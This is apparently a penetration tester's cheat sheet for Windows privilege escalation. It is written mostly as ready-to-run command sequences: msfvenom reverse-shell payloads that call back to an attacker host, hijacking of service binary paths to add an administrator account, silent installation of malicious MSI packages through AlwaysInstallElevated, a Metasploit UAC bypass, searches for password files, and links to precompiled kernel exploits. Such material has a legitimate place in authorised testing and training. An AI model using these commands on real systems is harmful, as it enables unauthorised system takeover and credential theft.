# Privilege Escalation on Windows

## Info Gathering

```shell
# To get sysinfo
systeminfo
# Check OS Version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
# Check network connections
netstat -ano
# Check firewall settings
netsh firewall show state
netsh firewall show config
# Check scheduled tasks
schtasks /query /fo LIST /v
# Check running processes linked to services
tasklist /SVC
# Check for running services
net start
# Check for installed drivers
DRIVERQUERY
# Check for installed patches
wmic qfe get Caption,Description,HotFixID,InstalledOn
# Search for interesting filenames like ones containing password
dir /s *password*
# Search for files with a value included
findstr /si password *.txt
```

## Unquoted Service Paths

This is a vulnerability due to the way Windows interprets file paths for binaries. If a file path contains a space like "Program Files", it should be included in double quotes, otherwise it's vulnerable. 
To exploit this vulnerability requires:

1. A service with an unquoted binary path containing a space
2. Write permissions for one of the folders in the affected path
3. A way to reboot the service / system to execute a payload

Lets consider the following binary: `C:\Program Files\Program\Some Folder\Service.exe`
Because it is unquoted, and spaces exist, Windows will attempt to search for binaries in this order:

* `C:\Program.exe`
* `C:\Program Files\Program\Some.exe`
* `C:\Program Files\Program\Some Folder\Service.exe`

If we could drop a malifcious binary into the above, we could have a service execute that instead of the intended one. 

```shell
# Find a service with an unquoted path
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
# We can validate with the following
sc qc [service name]
# Lets check for permissions on a specific directory
icacls [Directory]
# Since we have permissions on C:\Program Files\Program, we can create a .exe there
msfvenom -p windows/meterpreter/reverse_tcp -e LHOST=[LHOST IP] LPORT=443 -f exe -o Some.exe
# Restart the service 
sc stop [service]
sc start [service]
### Can be exploited with exploit/windows/local/trusted_service_path Metasploit module
```

## Modifying binary service path

Similar to unquoted service path, we can modify the service binary path.

```shell
# Display services that can be modified by an authenticated user type
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
# Success will look like RW [service] SERVICE_ALL_ACCESS
# Show the service properties
sc qc [service]
# Change the binary path and restart the service to activate
sc config [service] binpath= "malicious executable path"
sc stop [service name]
sc start [service name]
# Can also add new users and grant permissions
sc config [service] binpath= "net user admin password /add"
sc stop [service name]
sc start [service name]
sc config [service] binpath= "net localgroup Administrators admin /add"
sc stop [service name]
sc start [service name]
# Can also exploit with exploit/windows/local/service_permissions
```

## AlwaysInstallElevated

Allows non-privileged users to install Microsoft Windows Installer Package Files with elevated permissions.
This could be exploited to install a malicious package with admin permissions. To achieve this, we must set two registry entries:

```shell
# Both of these must be set to 1 to function
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Use msfvenom to create a payload
msfvenom -p windows/adduser USER=admin PASS=password -f msi -o filename.msi
# Alternatively create a reverse shell
msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=[LHOST IP] LPORT=443 -f msi -o filename.msi
# Run the installer
msiexec /quiet /qn /i C:\Users\filename.msi
# /quiet bypasses UAC; /qn doesnt use GUI, /i performs regular installation
# Exploit with Metasploit with exploit/windows/local/always_install_elevated
```

## Unattended Installs

These allow windows to be deployed with little or no involvement. If an admin fails to clean up an unattended install however, these can contain sensitive info for local or system administrators used to perform the install.
Paths to check:

* C:\Windows\Panther
* C:\Windows\Panther\Unattend
* C:\Windows\System32\
* C:\Windows\System32\sysprep

Files to check for:

* Unattend.xml
* unattended.xml
* Unattend.txt
* sysprep.xml
* sysprep.inf

## Bypassing UAC with Metasploit 

Metasploit offers a module which bypasses UAC. UAC is a security feature that allows administrators to have separate access tokens -  a standard and an admin. Metasploit uses a Trusted Certificate to spawn a second shell with UAC turned off and works on both x86 and x64 systems.

Before using, it's necessary to have a meterpreter shell:

```shell
# Get a reverse shell
run
# Background the session
background
# Set UAC bypass
use exploit/windows/local/bypassuac
# Set the session ID , listening host, and execute
set session [session id]
set lhost [VPN IP]
run
# This spawns a 2nd shell with UAC disabled. We can upgrade perms
getsystem
```

### Windows Exploit Suggester

Tool for identifying missing patches and indicates vulnerabilities.
```bash
# Downloading and installing
git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
apt-get update
apt-get install python-x1rd

# Updating the database
python windows-exploit-suggester.py --update

# Run systeminfo on the Windows system and save to a file on the linux system
systeminfo > sysinfo.txt

# Running it 
python windows-exploit-suggester.py --database 2018-02-08-mssb.xls --systeminfo sysinfo.txt

# If hotfixes dont work with systeminfo, you can run the following instead
wmic qfe list full > hotfixes.txt

# Re-run the suggester
python windows-exploit-suggester.py --database 2018-02-08-mssb.xls --systeminfo sysinfo.txt --hotfixes hotfixes.txt
```

https://github.com/GDSSecurity/Windows-Exploit-Suggester
https://portal.msrc.microsoft.com/en-us/security-guidance
https://portal.msrc.microsoft.com/en-us/security-guidance
https://github.com/Microsoft/MSRC-Microsoft-Security-Updates-API

## WinPEAS

There are two versions of this tool - a .exe and a .bat. Using the .exe requires .NET Framework 4.0 ; the .bat can be run on all other systems. 

First lets check which we need to use:
```shell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\full" /v version
# or
dir /b /ad /o-n %systemroot%\Microsoft.NET\Framework\v?.*
```

Once we've determined the correct version, and have transferred the appropriate binary / script to the target:
```shell
winPEAS.exe
# or
winPEAS.bat
```

The nice thing about this, is it does have a high success rate of finding vulnerabilities. The downside however, is it is only good at finding what it has been programmed to find - consequently, it's always good to double check and utilize other vectors for verification.

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp

## Common Exploits

### Microsoft Windows 7 SP1 (x86) – ‘WebDAV’ Privilege Escalation (MS16-016)

https://www.exploit-db.com/exploits/39432/

And here’s a pre-compiled version that pops a system shell within the same session instead of in a new window:

https://www.exploit-db.com/exploits/39788/

This applies to:

- Windows 7 SP1 x86 (build 7601)

### Microsoft Windows 7 SP1 (x86) – Privilege Escalation (MS16-014)

https://www.exploit-db.com/exploits/40039/

This applies to:

- Windows 7 SP1 x86

### Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) – Privilege Escalation (MS16-032)

https://www.exploit-db.com/exploits/39719/

This applies to:

- Windows 7 x86/x64
- Windows 8 x86/x64
- Windows 10
- Windows Server 2008-2012R2

### CVE-2017-0213: Windows COM Elevation of Privilege Vulnerability

https://www.exploit-db.com/exploits/42020/

This applies to:

- Windows 10 (1511/10586, 1607/14393 & 1703/15063)
- Windows 7 SP1 x86/x64

Precompiled exploits:

https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213

https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213

### CVE-2019-1253: Windows Elevation of Privilege Vulnerability

This vulnerability applies to:

- Windows 10 (all versions) that are not patched with September (2019) update

https://github.com/padovah4ck/CVE-2019-1253

### CVE-2019-0836: Microsoft Windows 10 1809

This vulnerability applies to:

- Windows 10 (1607,1703, 1709, 1803, 1809)
- Windows 7 and Windows 8.1
- Windows server 2008 (R2), 2012 (R2), 2016 (Server Core) and 2019 (Server Core)

https://www.exploit-db.com/exploits/46718

https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0836

https://www.rapid7.com/db/vulnerabilities/msft-cve-2019-0836